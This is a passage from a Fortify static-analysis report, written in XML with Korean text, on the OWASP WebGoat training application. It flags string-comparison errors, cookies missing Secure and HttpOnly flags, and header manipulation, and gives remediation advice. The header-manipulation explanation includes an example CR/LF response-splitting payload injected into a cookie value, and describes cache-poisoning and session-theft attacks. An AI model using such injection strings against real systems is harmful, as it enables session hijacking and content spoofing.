<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="D6987C4FB82223C3D9994B1B932BA4A0" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>XMLInjection.java의 createContent() 메서드는 문자열을 == 또는 !=이 아닌 equals() 메서드와 비교해야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XMLInjection.java</FilePath>
<LineStart>282</LineStart>
<Snippet>	if (s.getParser().getRawParameter("SUBMIT", "") != "")
	{
	    if (s.getParser().getRawParameter("check1004", "") != "")
	    {
		makeSuccess(s);</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F4771E926F22B246FB183A24C87DBE10" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>XMLInjection.java의 createContent() 메서드는 문자열을 == 또는 !=이 아닌 equals() 메서드와 비교해야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XMLInjection.java</FilePath>
<LineStart>280</LineStart>
<Snippet>	ec.addElement(b);

	if (s.getParser().getRawParameter("SUBMIT", "") != "")
	{
	    if (s.getParser().getRawParameter("check1004", "") != "")</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="73A1972FEC2D7272E695B74CCEC7B6C5" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WeakAuthenticationCookie.java의 checkParams() 메서드는 문자열을 == 또는 !=이 아닌 equals() 메서드와 비교해야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>142</LineStart>
<Snippet>	    }

	    if (loginID != "")
	    {
		Cookie newCookie = new Cookie(AUTHCOOKIE, loginID);</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BC03C8F1B56B9F2376C34ADF9C551E44" ruleID="3B074389-826B-4DDA-9FEF-05ECD125D1FC">
                            <Category>Code Correctness: Erroneous String Compare</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>XMLInjection.java의 createContent() 메서드는 문자열을 == 또는 !=이 아닌 equals() 메서드와 비교해야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XMLInjection.java</FilePath>
<LineStart>292</LineStart>
<Snippet>		{

		    if (s.getParser().getRawParameter("check" + i, "") != "")
		    {
			shipment.append(((Reward) rewardsMap.get(i)).getName()</Snippet>
<TargetFunction>Operation()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Cookie Security: Cookie not Sent Over SSL</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>true로 설정된 Secure 플래그 없이 쿠키가 생성됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>현재 웹 브라우저는 각 쿠키에 대해 Secure 플래그를 지원합니다. 플래그가 설정되면 브라우저는 HTTPS를 통해 쿠키를 전송하기만 합니다. 암호화되지 않은 채널을 통해 쿠키를 전송하면 네트워크 염탐 공격에 노출될 수 있으므로 안전한 플래그를 사용하는 것이 쿠키의 값 자격 증명을 유지하는 데 도움을 줍니다. 이것은 쿠키가 개인 정보를 포함하거나 세션 ID를 전하는 경우 특히 중요합니다.
  

예제 1: 다음 예에서는 Secure 플래그 설정 없이 쿠키가 응답에 추가되었습니다.

	Cookie cookie = new Cookie("emailCookie", email);
	response.addCookie(cookie);


응용 프로그램에서 HTTPS 및 HTTP 모두를 사용하지만 Secure 플래그를 설정하지 않는 경우, HTTPS 요청 중에 전송된 쿠키는 다음 HTTP 요청 중에도 전송됩니다. 암호화되지 않은 무선 연결을 통한 네트워크 트래픽 염탐은 공격자에게는 간단한 작업이므로 HTTP를 통한 쿠키(특히 세션 ID가 있는 쿠키) 전송은 응용 프로그램을 손상시킬 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>브라우저가 이러한 쿠키를 암호화하지 않고 전송하지 않도록 지시하려면 모든 새 쿠키에 대해 Secure 플래그를 설정하십시오. 이렇게 하려면 setSecure(true)를 호출합니다.

예제 2:

	Cookie cookie = new Cookie("emailCookie", email);
	cookie.setSecure(true);
	response.addCookie(cookie);
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="76956C6F50A8BB8878A246F1AC419422" ruleID="AC87E716-8766-4F78-8851-86354C03A13B">
                            <Category>Cookie Security: Cookie not Sent Over SSL</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>true로 설정된 Secure 플래그 없이 쿠키가 생성됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>193</LineStart>
<Snippet>
	Cookie newCookie = new Cookie(USER_COOKIE, "White");
	s.getResponse().addCookie(newCookie);

	ElementContainer ec = new ElementContainer();</Snippet>
<TargetFunction>addCookie(newCookie)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2A2549A45BA107BFC46244BD13790B37" ruleID="AC87E716-8766-4F78-8851-86354C03A13B">
                            <Category>Cookie Security: Cookie not Sent Over SSL</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>true로 설정된 Secure 플래그 없이 쿠키가 생성됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>209</LineStart>
<Snippet>	    weakid = newCookie();
	    Cookie cookie = new Cookie(SESSIONID, weakid);
	    s.getResponse().addCookie(cookie);
	}
</Snippet>
<TargetFunction>addCookie(cookie)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4D0F3E0D42BC3B7B51921EBC28FC5109" ruleID="AC87E716-8766-4F78-8851-86354C03A13B">
                            <Category>Cookie Security: Cookie not Sent Over SSL</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>true로 설정된 Secure 플래그 없이 쿠키가 생성됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>146</LineStart>
<Snippet>		Cookie newCookie = new Cookie(AUTHCOOKIE, loginID);
		s.setMessage("Your identity has been remembered");
		s.getResponse().addCookie(newCookie);

		return (username);</Snippet>
<TargetFunction>addCookie(newCookie)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C35E841239A860687BE4D44F0A632052" ruleID="AC87E716-8766-4F78-8851-86354C03A13B">
                            <Category>Cookie Security: Cookie not Sent Over SSL</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>true로 설정된 Secure 플래그 없이 쿠키가 생성됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>172</LineStart>
<Snippet>
	Cookie newCookie = new Cookie(USER_COOKIE, "White");
	s.getResponse().addCookie(newCookie);
	//&lt;END_OMIT_SOURCE&gt;
</Snippet>
<TargetFunction>addCookie(newCookie)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Cookie Security: HTTPOnly not Set</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>프로그램은 Challenge2Screen.java의 171 줄에 쿠키를 생성하지만 HttpOnly 플래그를 true로 설정하지 못합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>모든 주요 브라우저에서는 클라이언트 쪽 스크립트의 쿠키 액세스를 방지하는 HttpOnly 쿠키 속성을 지원합니다. Cross-Site Scripting 공격은 세션 ID 또는 인증 토큰을 도용하기 위해 쿠키에 액세스하는 경우도 있습니다. HttpOnly가 활성화되어 있지 않으면 공격자가 사용자 쿠키에 더 쉽게 액세스할 수 있습니다.


예제 1: 다음 코드는 HttpOnly 속성을 설정하지 않고 쿠키를 생성합니다.

javax.servlet.http.Cookie cookie = new javax.servlet.http.Cookie("emailCookie", email);
// Missing a call to: cookie.setHttpOnly(true);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>쿠키를 생성할 때 HttpOnly 속성을 활성화하십시오. 이렇게 하려면 javax.servlet.http.Cookie의 경우 true 인수를 사용하여 setHttpOnly(boolean) 메서드를 호출합니다.

예제 2: 다음 코드는 Example 1의 코드와 동일한 쿠키를 생성하지만 이번에는 HttpOnly 매개 변수를 true로 설정합니다.

javax.servlet.http.Cookie cookie = new javax.servlet.http.Cookie("emailCookie", email);
cookie.setHttpOnly(true);


하지만 HttpOnly가 true로 설정되었을 때 우회하는 여러 메커니즘이 개발되어 있으므로 완벽한 효과가 있는 것은 아닙니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="00A1A92CF9528CF7FC21469CA8C9D1D1" ruleID="1733FB59-CC13-4E99-9638-3D45FEEE9BE1">
                            <Category>Cookie Security: HTTPOnly not Set</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>프로그램은 Challenge2Screen.java의 171 줄에 쿠키를 생성하지만 HttpOnly 플래그를 true로 설정하지 못합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>171</LineStart>
<Snippet>	ec.addElement(input);

	Cookie newCookie = new Cookie(USER_COOKIE, "White");
	s.getResponse().addCookie(newCookie);
	//&lt;END_OMIT_SOURCE&gt;</Snippet>
<TargetFunction>newCookie = new Cookie(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EB0AC3FD9D13B7F5FACF682C311AB82F" ruleID="1733FB59-CC13-4E99-9638-3D45FEEE9BE1">
                            <Category>Cookie Security: HTTPOnly not Set</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>프로그램은 WeakSessionID.java의 208 줄에 쿠키를 생성하지만 HttpOnly 플래그를 true로 설정하지 못합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>208</LineStart>
<Snippet>	{
	    weakid = newCookie();
	    Cookie cookie = new Cookie(SESSIONID, weakid);
	    s.getResponse().addCookie(cookie);
	}</Snippet>
<TargetFunction>cookie = new Cookie(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AAC85F6655EC4F9B9057218E61BC7F2B" ruleID="1733FB59-CC13-4E99-9638-3D45FEEE9BE1">
                            <Category>Cookie Security: HTTPOnly not Set</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>프로그램은 WeakAuthenticationCookie.java의 144 줄에 쿠키를 생성하지만 HttpOnly 플래그를 true로 설정하지 못합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>144</LineStart>
<Snippet>	    if (loginID != "")
	    {
		Cookie newCookie = new Cookie(AUTHCOOKIE, loginID);
		s.setMessage("Your identity has been remembered");
		s.getResponse().addCookie(newCookie);</Snippet>
<TargetFunction>newCookie = new Cookie(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D80B3C1E0ED82E6A10A0460133911165" ruleID="1733FB59-CC13-4E99-9638-3D45FEEE9BE1">
                            <Category>Cookie Security: HTTPOnly not Set</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>프로그램은 Challenge2Screen.java의 192 줄에 쿠키를 생성하지만 HttpOnly 플래그를 true로 설정하지 못합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>192</LineStart>
<Snippet>	//&lt;START_OMIT_SOURCE&gt;

	Cookie newCookie = new Cookie(USER_COOKIE, "White");
	s.getResponse().addCookie(newCookie);
</Snippet>
<TargetFunction>newCookie = new Cookie(...)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Header Manipulation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 writeScreen() 메서드는 535 줄의 HTTP 응답 헤더에 확인되지 않은 데이터를 포함합니다. 이는 캐시 감염(cache-poisoning), cross-site scripting, 교차 사용자 변조(cross-user defacement), 페이지 하이재킹(page hijacking), 쿠키 조작 또는 open redirection과 같은 공격을 유발합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Header Manipulation 취약점은 다음과 같은 경우에 발생합니다.

1. 데이터가 신뢰할 수 없는 소스, 주로 HTTP 요청을 통해 응용 프로그램에 들어갑니다.


2. 데이터는 확인 작업을 거치지 않고 웹 사용자에게 전달된 HTTP 응답 헤더에 포함됩니다.

많은 소프트웨어 보안 취약점과 마찬가지로 Header Manipulation은 목적의 수단일 뿐 목적 자체는 될 수 없습니다. 이 취약점은 본질적으로 간단 명료합니다. 공격자가 악성 데이터를 취약한 응용 프로그램에 전달하고 응용 프로그램은 HTTP 응답 헤더에 데이터를 포함합니다.

가장 일반적인 Header Manipulation 공격의 하나는 HTTP Response Splitting 입니다. HTTP Response Splitting 익스플로이트가 성공하려면 응용 프로그램은 헤더에 CR(캐리지 리턴, %0d 또는 \r로도 표시) 및 LF(줄 바꿈, %0a 또는 \n으로도 표시) 문자가 있는 입력을 허용해야 합니다. 이들 문자는 공격자에게 응용 프로그램이 보내려는 응답의 나머지 헤더 및 본문에 대한 제어권을 부여할 뿐 아니라 추가 응답을 공격자 마음대로 만들 수 있게 합니다.

현대의 많은 응용 프로그램 서버는 악성 문자가 HTTP 헤더에 삽입되는 것을 방지합니다. 예를 들어, Apache Tomcat의 최신 버전은 금지된 문자로 헤더를 설정할 경우 IllegalArgumentException을 발생시킵니다. 응용 프로그램 서버가 새 줄 문자로 헤더를 설정하는 것을 방해한다면, 해당 응용 프로그램은 HTTP Response Splitting에 취약하지 않습니다. 그러나, 단지 새 줄 문자에 대한 필터링은 쿠키 조작 또는 Open Redirection에 대해 응용 프로그램을 취약하게 남겨둘 수 있기 때문에 사용자 입력으로 HTTP 헤더를 설정할 때는 여전히 주의해야 합니다.

예제: 다음 코드 세그먼트는 HTTP 요청에서 웹로그 엔트리의 작성자 이름 author를 읽어들여 HTTP 응답의 쿠키 헤더에 설정합니다.


String author = request.getParameter(AUTHOR_PARAM);
...
Cookie cookie = new Cookie("author", author);
     cookie.setMaxAge(cookieExpiration);
     response.addCookie(cookie);


"Jane Smith"와 같은 표준 영숫자로 이루어진 문자열을 요청에 따라 전송한다고 가정하면 이 쿠키가 포함된 HTTP 응답은 다음과 같은 형식이 됩니다.


HTTP/1.1 200 OK
...
Set-Cookie: author=Jane Smith
...


하지만 쿠키의 값이 확인되지 않은 사용자 입력으로 형성되기 때문에 응답은 AUTHOR_PARAM에 전송된 값에 CR 및 LF 문자가 들어 있지 않을 때에만 이 형식을 유지합니다. 공격자가 "Wiley Hacker\r\nHTTP/1.1 200 OK\r\n..."과 같은 악성 문자열을 전송하는 경우 HTTP 응답은 다음과 같이 두 개의 응답으로 나누어집니다.


HTTP/1.1 200 OK
...
Set-Cookie: author=Wiley Hacker

HTTP/1.1 200 OK
...


두 번째 응답은 공격자가 완전히 제어하고 있으므로 원하는 헤더와 본문 내용으로 마음대로 작성할 수 있습니다. 공격자가 임의의 HTTP 응답을 작성할 수 있으므로 교차 사용자 변조(cross-user defacement), 웹 및 브라우저 캐시 감염(cache-poisoning), Cross-Site Scripting 및 페이지 하이재킹(page hijacking) 등의 다양한 공격을 할 수 있습니다.

교차 사용자 변조(cross-user defacement): 공격자는 피해 서버에 하나의 요청을 보낼 수 있게 되어 서버가 두 개의 응답을 만들게 하는데 두 번째 응답은 다른 요청에 대한 응답으로 잘못 해석될 수 있습니다. 이를테면, 서버와 같은 TCP 연결을 공유하는 다른 사용자의 요청에 대한 응답으로 해석됩니다. 이는 사용자를 속여 악성 요청을 사용자 스스로 전송하게 하거나 공유 프록시 서버처럼 공격자와 사용자가 서버에 대한 하나의 TCP 연결을 공유하는 경우 원격으로 전송하도록 합니다. 공격자가 이 능력을 이용하여 사용자가 응용 프로그램이 해킹당했다고 믿게 만들고 응용 프로그램 보안에 대한 자신감을 상실하게 만드는 정도면 다행이라고 할 수 있습니다. 최악의 경우, 공격자는 응용 프로그램 동작을 모방하여 계정 번호와 암호 등의 개인 정보를 공격자에게 리디렉션하는 특별히 제작된 콘텐트를 이용하기도 합니다.

캐시 감염(cache-poisoning): 여러 사용자가 사용하는 웹 캐시 또는 단일 사용자의 브라우저 캐시에서 악의적인 목적으로 생성된 응답을 캐시하는 경우 그 영향이 확대됩니다. 프록시 서버에서 흔히 볼 수 있는 것과 같이 공유 웹 캐시에 응답이 캐시되는 경우, 해당 캐시의 모든 사용자가 캐시 항목이 없어질 때까지 악성 콘텐트를 계속 받습니다. 마찬가지로 응답이 개인 사용자의 브라우저에 캐시되는 경우, 해당 사용자는 캐시 항목이 없어질 때까지 악성 콘텐트를 계속 받게 되지만 로컬 브라우저 인스턴스의 사용자만 영향을 받습니다. 

Cross-Site Scripting: 공격자가 응용 프로그램이 보내는 응답을 제어하게 되면 다양한 악성 컨텐츠를 선택하여 사용자에게 보낼 수 있습니다. Cross-site scripting은 응답에 포함된 악의적인 JavaScript 또는 기타 코드가 사용자의 브라우저에서 실행되는 경우의 일반적인 공격 형태입니다. XSS 기반의 공격은 거의 무제한으로 다양하지만, 흔히 쿠키 또는 기타 세션 정보와 같은 개인 데이터를 공격자에게 전송하여 피해자를 공격자가 제어하는 웹 콘텐트에 리디렉션하거나 피해 사이트로 위장하고 사용자 컴퓨터에 기타 악의적인 작업을 수행하는 것이 공통적인 수법입니다. 취약한 응용 프로그램의 사용자에게 가장 일반적이고 위험한 공격은 JavaScript를 사용하여 세션 및 authentication 정보를 공격자에게 전송하는 것입니다. 그러면 공격자는 피해자 계정을 완전히 장악할 수 있습니다.

페이지 하이재킹(page hijacking): 취약한 응용 프로그램을 사용하여 악성 콘텐트를 사용자에게 보내는 것 외에, 같은 취약점을 이용하여 서버가 사용자에게 보내기 위해 생성한 민감한 콘텐트를 공격자에게 리디렉션할 수도 있습니다. 공격자는 의도한 서버의 응답과 공격자가 생성한 응답 두 가지를 생성하는 요청을 전송하여, 공유 프록시 서버 같은 중간 노드에서 서버에서 생성되어 사용자에게 가야 할 응답을 공격자에게 보내도록 할 수 있습니다. 공격자가 만든 요청은 두 가지 응답을 생성하기 때문에 첫 번째는 공격자의 요청에 대한 응답으로 해석되고 두 번째는 불확실한 상태로 남게 됩니다. 사용자가 한 TCP 연결을 통해 올바른 요청을 할 때 공격자의 요청이 이미 대기하고 있다가 사용자의 요청에 대한 응답으로 해석됩니다. 그런 다음, 공격자가 서버에 두 번째 요청을 보내면 프록시 서버가 피해자에게 보내기 위해 서버가 생성해 놓은 요청으로 응답합니다. 따라서 피해자가 수신해야 할 응답의 헤더와 본문에 있는 민감한 정보가 노출되는 것입니다.

쿠키 조작: Cross-Site Request Forgery와 같은 공격과 결합된 경우, 공격자는 올바른 사용자의 쿠키를 변경하거나 해당 쿠키에 추가하거나 쿠키를 덮어쓸 수도 있습니다.

Open Redirection: 확인되지 않은 입력이 리디렉션에 사용되는 URL을 제어하도록 허용하면 피싱 공격에 취약해질 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Header Manipulation 방지를 위한 해결 방법은 필요한 위치에서 입력값 검증 작업을 수행하여 속성이 올바른지 확인하도록 하는 것입니다.

Header Manipulation 취약점은 응용 프로그램이 출력에 악성 데이터를 포함할 때 발생하기 때문에 한 가지 논리적인 접근 방식은 데이터가 응용 프로그램을 벗어나기 직전에 데이터를 확인하는 것입니다. 하지만 웹 응용 프로그램에는 응답을 동적으로 생성하기 위한 복잡하고 까다로운 코드가 있기 때문에 이 방법은 생략(검증 누락) 오류가 발생할 가능성이 큽니다. 이런 위험을 완화하는 효과적인 방법 역시 Header Manipulation의 입력값 검증을 수행하는 것입니다.

웹 응용 프로그램은 SQL Injection과 같은 다른 취약점을 방지하기 위해 모든 입력을 확인해야 합니다. 따라서 응용 프로그램의 기존 입력값 검증 메커니즘에 Header Manipulation 검사를 포함하도록 확대하는 것이 비교적 쉽습니다. Header Manipulation의 입력값 검증이 아무리 뛰어나더라도 엄격한 출력 검증을 대신할 수는 없습니다. 응용 프로그램은 공유 데이터 저장소 또는 기타 신뢰할 수 있는 소스를 통해 입력을 받는데 그 데이터 저장소가 적절한 입력값 검증을 수행하지 않는 소스에서 입력을 받을 수 있습니다. 따라서 응용 프로그램은 어떤 경우에도 이런 저런 데이터의 안전을 신뢰할 수 없습니다. 즉, Header Manipulation 취약점을 방지하는 최선의 방법은 응용 프로그램에 들어가거나 응용 프로그램에서 사용자에게 전달되는 모든 입력을 확인하는 것입니다.

가장 안전한 Header Manipulation 검증 방법은 HTTP 응답 헤더에 사용할 수 있는 안전한 문자의 허용 목록을 만들어 이 문자 집합의 문자만으로 이루어진 입력만 받는 것입니다. 예를 들어, 올바른 사용자 이름은 영숫자만 사용하도록 하거나 계정 번호는 숫자 0-9만 사용하도록 합니다.

보다 유연하지만 안전성이 떨어지는 접근 방식은 거부 목록을 구현하는 것입니다. 이 방식은 입력을 사용하기 전에 위험한 문자를 선별적으로 거부하거나 이스케이프 처리합니다. 이러한 목록을 만들려면 먼저 HTTP 응답 헤더에 특별한 의미가 있는 문자 집합을 이해해야 합니다. CR 및 LF 문자가 HTTP Response Splitting 공격의 핵심이지만 ':' (콜론) 및 '='(등호)와 같은 다른 문자도 응답 헤더에 특별한 의미가 있습니다.

응용 프로그램에서 Header Manipulation 공격을 확인하는 정확한 지점과 확인 과정에서 고려해야 하는 특수 문자를 식별한 후 다음 과제는 확인 과정에서 특수 문자를 처리하는 방법을 알아내는 것입니다. 응용 프로그램은 HTTP 응답 헤더에 포함해야 할 입력에 특수 문자 특히, CR 및 LF가 있는 경우, 잘못된 입력으로 보고 거부해야 합니다.

많은 응용 프로그램 서버는 응용 프로그램이 HTTP Response Splitting 공격에 필수적인 문자가 있는지 확인하는 HTTP 헤더 및 쿠키 설정을 담당하는 기능을 구현하여 HTTP Response Splitting 취약점에 노출되는 것을 막으려고 합니다. 응용 프로그램을 실행하는 서버에 응용 프로그램의 보안을 맡길 수 없습니다. 개발된 응용 프로그램이 응용 프로그램의 수명 동안 어떤 서버에서 실행될지 알 수 없기 때문입니다. 표준 및 알려진 익스플로이트의 진화 속도에 따라 응용 프로그램 서버가 계속 진화한다는 보장이 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 대부분의 HttpServletRequest 구현은 getHeader()에서 URL 인코딩 문자열을 반환하며, 먼저 디코딩되지 않는 한 CR 및 LF 문자가 해당 인코딩 형태에서 메타 의미로 이동하지 않기 때문에 HTTP response splitting 이슈가 발생하지 않습니다. 그러나 이러한 작동은 J2EE 표준으로 지정되어 있지 않으며 구현에 의해 달라집니다. 또한, getHeader()가 반환한 인코딩된 사용자 입력으로도 리디렉션 열기 및 다른 HTTP 헤더 조작을 포함하는 다른 취약점이 나타날 수 있습니다.

2. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.

3. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7EE2372D0C9398D6F28362CB801A5D49" ruleID="790A125E-5BFE-4931-A51A-29B7D5BECC93">
                            <Category>Header Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HttpOnly.java의 setHttpOnly() 메서드는 198 줄의 HTTP 응답 헤더에 확인되지 않은 데이터를 포함합니다. 이는 캐시 감염(cache-poisoning), cross-site scripting, 교차 사용자 변조(cross-user defacement), 페이지 하이재킹(page hijacking), 쿠키 조작 또는 open redirection과 같은 공격을 유발합니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
